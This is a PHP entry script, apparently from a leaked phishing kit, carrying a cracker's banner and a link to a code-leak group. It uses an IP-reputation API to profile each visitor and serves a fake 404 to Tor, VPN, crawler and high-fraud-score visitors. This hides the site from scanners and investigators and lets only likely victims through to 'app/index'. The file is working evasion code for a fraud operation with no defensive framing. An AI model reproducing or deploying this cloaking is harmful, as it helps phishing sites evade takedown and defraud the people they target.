<?php
/*
▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
.▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ 
FuCkEd By [!]DNThirTeen
https://www.facebook.com/groups/L34K.C0de/
*/
require 'extra/mine.php';	
require 'extra/algo.php';
session_start();
$_SESSION["ip"] = clientData('ip');
	$ch=curl_init();
	curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
	curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch,CURLOPT_URL,"https://www.ipqualityscore.com/api/json/ip/".$ip_protection_api."/".$_SESSION["ip"]."");
	curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
	curl_setopt($ch,CURLOPT_TIMEOUT,400);
	$json=curl_exec($ch);
$success = trim(strip_tags(get_string_between($json,'success":',',"')));
$isp = trim(strip_tags(get_string_between($json,'"ISP":"','","')));
$proxy = trim(strip_tags(get_string_between($json,'"proxy":',',"')));
$tor = trim(strip_tags(get_string_between($json,'"tor":',',"')));
$vpn = trim(strip_tags(get_string_between($json,'vpn":',',"')));
$is_crawler = trim(strip_tags(get_string_between($json,'is_crawler":',',"')));
$region = trim(strip_tags(get_string_between($json,'region":"','","')));
$city = trim(strip_tags(get_string_between($json,'city":"','","')));
$timezone = trim(strip_tags(get_string_between($json,'timezone":"','","')));
$fraud_score = trim(strip_tags(get_string_between($json,'fraud_score":',',"')));
$_SESSION['ip_city']=$region;
$_SESSION['ip_state']=$city;
$_SESSION['ip_timezone']=$timezone;
if ($ip_protection=="yes") {
if ($fraud_score >= "".$max_fraud_score.""|| $tor == "".$fuck_tor."" || $vpn == "".$fuck_vpn."" || $is_crawler == "".$fuck_crawler."" || $success == "false") {
    exit(header('HTTP/1.0 404 Not Found'));
}
}
$acsh33nz0key = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
$_SESSION['acsh33nz0key'] = $acsh33nz0key;
exit(header("Location: app/index"));
?>